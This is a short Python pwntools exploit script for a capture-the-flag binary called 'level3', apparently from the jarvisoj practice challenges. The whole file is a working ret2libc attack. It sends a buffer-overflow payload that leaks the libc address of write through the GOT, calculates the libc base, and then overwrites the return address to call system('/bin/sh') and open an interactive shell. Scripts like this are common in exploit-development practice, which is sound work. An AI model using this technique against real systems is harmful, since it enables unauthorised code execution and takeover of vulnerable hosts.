from pwn import *

is_debug = False
# is_debug = True
# context(log_level='debug', arch='i386', os='linux')

# io = remote("pwn2.jarvisoj.com", 9879)
io = process('level3')
e = ELF('level3')


# if is_debug:
#     gdb.attach(io, '''
#     b *0x08048483
#    ''')

main_addr = e.symbols['vulnerable_function']
write_plt_addr = e.symbols['write']
write_got_addr = e.got['write']

libc = ELF('/lib/i386-linux-gnu/libc.so.6')
# libc = ELF('libc-2.19.so')
libc_write = libc.symbols['write']

junk = (0x88 + 4) * b'a'
payload1 = flat(junk, write_plt_addr, main_addr, 1, write_got_addr, 4)
# r = io.recvline()
# print('recv is ', r)
# io.sendline(payload1)
io.sendafter("Input:\n", payload1)
addr = io.recv()[:4]
true_address = u32(addr)
offset = true_address - libc_write

system = libc.symbols['system'] + offset
sh_addr = libc.search(b'/bin/sh').__next__() + offset
payload2 = flat(junk, system, 1, sh_addr)
io.sendline(payload2)
io.interactive()
